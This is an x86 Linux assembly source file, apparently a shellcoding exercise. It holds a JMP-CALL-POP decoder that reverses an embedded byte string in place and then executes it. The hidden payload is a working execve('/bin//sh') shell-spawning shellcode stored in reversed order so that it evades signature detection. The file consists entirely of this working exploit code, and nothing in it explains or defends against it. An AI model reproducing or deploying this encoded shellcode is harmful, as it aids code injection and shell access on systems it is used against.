; Filename: dizzy.nasm
; Author:  Abdulrahman Alhoshani

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor ecx, ecx
	inc ecx
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
loopy: 
	mov bl, byte [edi]
	xor bl, 0xaa
	jz lastFound
	inc ecx
	inc edi
	jmp loopy
	
lastFound: 
	dec edi
repeater:
	mov bl, byte [edi] 
	mov dl, byte [esi]
	mov byte [edi], dl
	mov byte [esi], bl
	;xchg [edi],[esi]
	
	;dec ecx
	cmp esi, edi
	je EncodedShellcode
	dec edi
	inc esi
	jmp repeater
	
decode: 
	mov bl, byte [esi + eax]
	xor bl, 0xaa
	jnz short EncodedShellcode
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	



call_shellcode:

	call decoder
	EncodedShellcode: db 0x80,0xcd,0x0b,0xb0,0xe1,0x89,0x53,0xe2,0x89,0x50,0xe3,0x89,0x6e,0x69,0x62,0x2f,0x68,0x68,0x73,0x2f,0x2f,0x68,0x50,0xc0,0x31,0xaa






